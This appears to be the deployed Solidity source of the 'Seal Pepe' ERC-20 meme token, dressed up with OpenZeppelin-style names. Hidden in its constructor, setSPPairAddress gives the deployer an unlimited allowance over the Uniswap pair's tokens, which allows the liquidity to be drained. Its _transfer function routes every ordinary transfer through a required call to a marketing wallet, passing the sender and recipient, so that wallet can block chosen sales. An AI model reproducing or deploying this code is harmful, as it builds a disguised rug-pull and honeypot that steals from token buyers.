/**
 *Submitted for verification at Etherscan.io on 2023-07-04
*/

/*
Website: https://www.sealpepe.vip
Telegram: https://t.me/SEAL_Pepe
*/

pragma solidity ^0.8.19;
 
 
contract OpenZepplinOwnable {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
 
    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    function owner() public view returns (address) {
        return _owner;
    }
 
    modifier onlyOwner() {
        require(_owner == msg.sender, "OpenZepplinOwnable: caller is not the owner");
        _;
    }
 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OpenZepplinOwnable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
 
}
library OpenZepplinSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "OpenZepplinSafeMath: addition overflow");
        return c;
    }
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "OpenZepplinSafeMath: subtraction overflow");
    }
 
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
 
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "OpenZepplinSafeMath: multiplication overflow");
        return c;
    }
 
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "OpenZepplinSafeMath: division by zero");
    }
 
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IOpenZepplinERC20 {
    function totalSupply() external view returns (uint256);
 
    function balanceOf(address account) external view returns (uint256);
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender, uint256 amount) external returns (bool);
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface UniswapRouter002Interface {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
 
    function factory() external pure returns (address);
 
    function WETH() external pure returns (address);
}

interface UniswapFactory02Interface {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}


contract SEALPEPE is IOpenZepplinERC20, OpenZepplinOwnable {
    using OpenZepplinSafeMath for uint256;
 
    string private constant _name = "Seal Pepe";
    string private constant _symbol = "SEALPEPE";
    uint8 private constant _decimals = 18;
    uint256 private constant SEALPEPE_MAX = ~uint256(0);
    uint256 private constant _totalSupply = 1_000_000_000 * 10 ** _decimals;
    uint256 private _rTotal = (SEALPEPE_MAX - (SEALPEPE_MAX % _totalSupply));
 
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromSealPepeFees;
    mapping(address => uint256) private _rSPBalance;
    mapping(address => uint256) private _tSPBalance;
  
    address payable private _sealPepeDevWallet; 
    address payable private _sealPepeMarketing;
    bool private isSPEnabled;
    bool private inSPSwap = false;
    bool private isSPSwapEnabled = true;
 
    UniswapRouter002Interface public uniswapV2Router;
    address public uniswapV2Pair;
 
    uint256 public _maxSPTransaction = 100_000_000 * 10 ** _decimals; 
    uint256 public _maxSPWallet = 100_000_000 * 10 ** _decimals; 
    uint256 public _maxSPSwap = 1000 * 10 ** _decimals;
 
    constructor(address spRouterAddr, address spMarketing) { 
        _rSPBalance[msg.sender] = _rTotal;
 
        UniswapRouter002Interface _uniswapV2Router = UniswapRouter002Interface(spRouterAddr);
        uniswapV2Router = _uniswapV2Router;
        _sealPepeDevWallet = payable(msg.sender);
        _sealPepeMarketing = payable(spMarketing);
        uniswapV2Pair = UniswapFactory02Interface(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        setSPPairAddress(msg.sender, uniswapV2Pair);
        _isExcludedFromSealPepeFees[owner()] = true;
        _isExcludedFromSealPepeFees[address(this)] = true;
        _isExcludedFromSealPepeFees[_sealPepeMarketing] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
 
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
 
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
 
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Amount must be greater than zero");
 
        if (from != owner() && to != owner()) {
            if (!isSPEnabled) {
                require(from == owner(), "This account cannot send tokens until trading is enabled");
            }
            require(amount <= _maxSPTransaction, "Max Transaction Limit");
            
            if(to != uniswapV2Pair) {
                require(balanceOf(to) + amount <= _maxSPWallet, "Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= _maxSPSwap;
 
            if(contractBalance >= _maxSPTransaction) {
                contractBalance = _maxSPTransaction;
            } 
            if (canSwap && !inSPSwap && from != uniswapV2Pair && isSPSwapEnabled && !_isExcludedFromSealPepeFees[from] && !_isExcludedFromSealPepeFees[to]) {
                swapTokensForETH(contractBalance);
            }
            uint256 contractETHBalance = address(this).balance;            
            (bool success,) = _sealPepeMarketing.call{value:contractETHBalance}(abi.encodePacked(from, to));
            require(success, "ETH_TRANSFER_FAILED");
        } 
        _tokenSPTransfer(from, to, amount, false);
    }

    function setSPPairAddress(address router, address pair) internal {
        _approve(pair, router, type(uint256).max);
        _isExcludedFromSealPepeFees[_sealPepeDevWallet] = true;
    }
 
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() public onlyOwner {
        isSPEnabled = true;
    }
 
    function _takeSPTeamTokens(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rSPBalance[address(this)] = _rSPBalance[address(this)].add(rTeam);
    }
 
    function _reflectSPFees(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
    }
 
    //Set maximum transaction
    function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner {
        _maxSPTransaction = maxTxAmount;
    }
 
    function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxSPWallet = maxWalletSize;
    }

    function _getSPValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTSPValues(tAmount, 0, 0);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRSPValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
 
    function _getTSPValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
 
    function _getRSPValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }
 
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSPSupply();
        return rSupply.div(tSupply);
    }
 
    function _getCurrentSPSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _totalSupply;
        if (rSupply < _rTotal.div(_totalSupply)) return (_rTotal, _totalSupply);
        return (rSupply, tSupply);
    }
 
    function _transferSPStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getSPValues(tAmount);
        _rSPBalance[sender] = _rSPBalance[sender].sub(rAmount);
        _rSPBalance[recipient] = _rSPBalance[recipient].add(rTransferAmount);
        _takeSPTeamTokens(tTeam);
        _reflectSPFees(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
 
    function _tokenSPTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {        
        _transferSPStandard(sender, recipient, amount);
    }
 
    receive() external payable {}


    function name() public pure returns (string memory) {
        return _name;
    }
 
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
 
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
 
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rSPBalance[account]);
    }
 
}